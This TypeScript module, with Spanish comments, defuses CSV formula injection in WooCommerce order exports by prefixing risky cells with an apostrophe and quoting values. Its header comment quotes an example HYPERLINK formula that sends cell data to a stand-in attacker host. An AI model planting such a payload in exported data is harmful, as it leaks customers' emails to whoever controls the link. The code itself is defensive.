/**
 * Celdas de CSV a prueba de fórmulas.
 *
 * Excel y LibreOffice interpretan como fórmula una celda de texto que empieza
 * por `=`, `+`, `-` o `@` (y también por tabulador o retorno de carro, que
 * algunas versiones se comen antes de mirar el resto). En los pedidos que
 * llegan de WooCommerce el nombre y el correo los escribe el cliente: con
 * `=HYPERLINK("https://atacante/?d="&E2;"Ver")` como nombre, al abrir la
 * exportación y pulsar la celda saldrían los correos de otros clientes.
 *
 * Remedio estándar (OWASP «CSV Injection»): anteponer un apóstrofo. La hoja lo
 * toma como «esto es texto» y no lo enseña.
 *
 * No se tocan los números (tipo number) ni el texto que solo es un número
 * escrito («-12,50», «+34»): no pueden ser una fórmula y un apóstrofo delante
 * los convertiría en texto al abrirlos.
 */

const INICIO_PELIGROSO = /^[=+\-@\t\r]/;
const SOLO_NUMERO = /^[+-]?\d[\d.,\s]*(%|\s?€)?$/;

/** El texto de la celda, neutralizado si podría leerse como fórmula. */
export function celdaSegura(valor: string | number | null | undefined): string {
  if (valor === null || valor === undefined) return "";
  if (typeof valor === "number") return String(valor);
  if (!INICIO_PELIGROSO.test(valor)) return valor;
  if (SOLO_NUMERO.test(valor)) return valor;
  return `'${valor}`;
}

/** Una celda ya entrecomillada para CSV: neutralizada y con las comillas dobladas. */
export function celdaCSV(valor: string | number | null | undefined): string {
  return `"${celdaSegura(valor).replace(/"/g, '""')}"`;
}

/** Las filas como texto CSV (sin BOM), separadas por coma y salto de línea. */
export function filasCSV(filas: (string | number | null | undefined)[][]): string {
  return filas.map((f) => f.map(celdaCSV).join(",")).join("\n");
}
